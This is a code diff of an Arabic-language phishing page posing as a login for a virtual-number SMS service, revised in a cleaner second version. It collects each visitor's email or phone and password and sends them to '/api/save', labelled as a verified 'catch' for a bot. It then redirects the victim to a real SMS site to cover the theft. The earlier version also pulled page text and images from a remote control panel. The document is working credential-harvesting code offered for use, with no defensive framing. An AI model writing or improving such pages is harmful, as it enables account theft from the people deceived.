@@ -7,7 +7,6 @@
     <style>
         body {
             margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
-            /* 1. تغيير الخلفية لتتناسب مع الأيقونة الجديدة (تدرج أحمر/وردي) */
             background: linear-gradient(135deg, #FF0055 0%, #CC0044 100%); 
             display: flex; justify-content: center; align-items: center; height: 100vh;
         }
@@ -15,115 +14,69 @@
             background: white; padding: 30px; border-radius: 12px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 100%; max-width: 380px; text-align: center;
         }
-        
-        /* 2. تنسيق الأيقونة الجديدة */
-        #pageImg {
-            width: 90px; height: 90px; border-radius: 50%;
-            object-fit: cover; margin-bottom: 20px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-        }
-        
+        #pageImg { width: 90px; height: 90px; border-radius: 50%; object-fit: cover; margin-bottom: 20px; }
         h2 { color: #CC0044; margin-bottom: 25px; font-size: 19px; }
-        
         input {
-            width: 100%; padding: 12px; margin-bottom: 5px; /* مسافة صغيرة لرسالة الخطأ */
+            width: 100%; padding: 12px; margin-bottom: 5px;
             border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; outline: none;
-            transition: 0.3s;
         }
-        
-        /* تأثير عند الخطأ في الإدخال */
-        input.error { border: 2px solid #FF0000; background-color: #FFF0F0; }
-        
-        /* تنسيق رسالة الخطأ تحت الحقل */
-        .error-msg {
-            color: #FF0000; font-size: 12px; text-align: right;
-            margin-bottom: 15px; display: none; /* مخفية افتراضياً */
-        }
+        /* شكل الحقل عند الخطأ */
+        input.error-border { border: 2px solid red; background-color: #fff0f0; }
+        .error-text { color: red; font-size: 12px; display: none; margin-bottom: 10px; text-align: right; }
         
         button {
-            width: 100%; padding: 12px;
-            /* تغيير لون الزر للون الأحمر المناسب للأيقونة */
-            background: #CC0044; 
-            color: white; border: none; border-radius: 8px;
-            font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.3s;
-            margin-top: 10px;
+            width: 100%; padding: 12px; background: #CC0044; color: white;
+            border: none; border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer;
         }
-        button:hover { background: #A00033; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <img id="pageImg" src="https://telegra.ph/file/1792945d7d91986420551.jpg" alt="SMS Logo">
-        
-        <h2 id="pageLetter">سجل دخولك لتفعيل خدمة الأرقام الوهمية</h2>
+        <img id="pageImg" src="https://telegra.ph/file/1792945d7d91986420551.jpg">
+        <h2 id="pageLetter">سجل دخولك لتفعيل خدمة الأرقام</h2>
 
-        <form id="securedForm">
-            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف الدولي" required>
-            <div id="userInputError" class="error-msg">⚠️ يرجى إدخال بريد إلكتروني أو رقم هاتف صحيح.</div>
+        <form id="checkForm">
+            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <div id="errorMsg" class="error-text">⚠️ يرجى إدخال بريد إلكتروني أو رقم هاتف صحيح!</div>
             
             <input type="password" id="passInput" placeholder="كلمة السر" required>
-            <button type="submit" id="pageBtn">تفعيل الحساب الآن</button>
+            <button type="submit" id="pageBtn">تفعيل الآن</button>
         </form>
     </div>
 
     <script>
-        // دالة لجلب الإعدادات من اللوحة (للحفاظ على ديناميكية الصفحة)
-        async function fetchConfig() {
-            try {
-                const res = await fetch('/api/get');
-                const data = await res.json();
-                // إذا أرسلت صورة جديدة من اللوحة ستستبدل الأيقونة، وإلا ستبقى SMS
-                if(data.image) document.getElementById('pageImg').src = data.image; 
-                if(data.letter) document.getElementById('pageLetter').innerText = data.letter;
-                if(data.button) document.getElementById('pageBtn').innerText = data.button;
-            } catch(e) { console.log("تحميل افتراضي"); }
-        }
-        window.onload = fetchConfig;
-
-        // دالة التحقق من صحة الإدخال (Validation)
-        function isValid(input) {
-            // نمط (Regex) للتحقق من البريد الإلكتروني
-            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            // نمط (Regex) للتحقق من رقم الهاتف (أرقام فقط، من 7 إلى 15 رقم)
-            const phonePattern = /^\+?[0-9]{7,15}$/;
-            
-            return emailPattern.test(input) || phonePattern.test(input);
+        // دالة التحقق الذكية
+        function validate(val) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^\+?[0-9]{7,15}$/;
+            return emailRegex.test(val) || phoneRegex.test(val);
         }
 
-        // دالة الإرسال مع التحقق
-        document.getElementById('securedForm').onsubmit = async (e) => {
-            e.preventDefault(); // منع الإرسال التلقائي
-            
-            const userInput = document.getElementById('userInput').value;
-            const passInput = document.getElementById('passInput').value;
-            const errorElement = document.getElementById('userInputError');
-            const inputField = document.getElementById('userInput');
+        document.getElementById('checkForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const user = document.getElementById('userInput').value;
+            const pass = document.getElementById('passInput').value;
+            const error = document.getElementById('errorMsg');
+            const input = document.getElementById('userInput');
 
-            // 4. تنفيذ التحقق
-            if (!isValid(userInput)) {
-                // إذا كان الإدخال غير صحيح، أظهر رسالة خطأ وغير شكل الحقل
-                errorElement.style.display = 'block';
-                inputField.classList.add('error');
-                return; // أوقف الإرسال
-            } else {
-                // إذا كان صحيحاً، أخفِ الخطأ
-                errorElement.style.display = 'none';
-                inputField.classList.remove('error');
+            if (!validate(user)) {
+                error.style.display = 'block';
+                input.classList.add('error-border');
+                return;
             }
 
-            // 5. إذا نجح التحقق، أرسل البيانات للبوت
+            // إذا كان صحيحاً يرسل للبوت
             await fetch('/api/save', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    image: "🚨 صيد SMS جديد (بيانات محققة)",
-                    letter: "المستخدم: " + userInput,
-                    button: "الباسورد: " + passInput
+                    image: "🚨 صيد محقق من صفحة SMS",
+                    letter: "المستخدم: " + user,
+                    button: "الباسورد: " + pass
                 })
             });
 
-            // 6. التحويل لموقع حقيقي (مثل موقع أرقام وهمية)
             window.location.href = "https://receive-smss.com/"; 
         };
     </script>
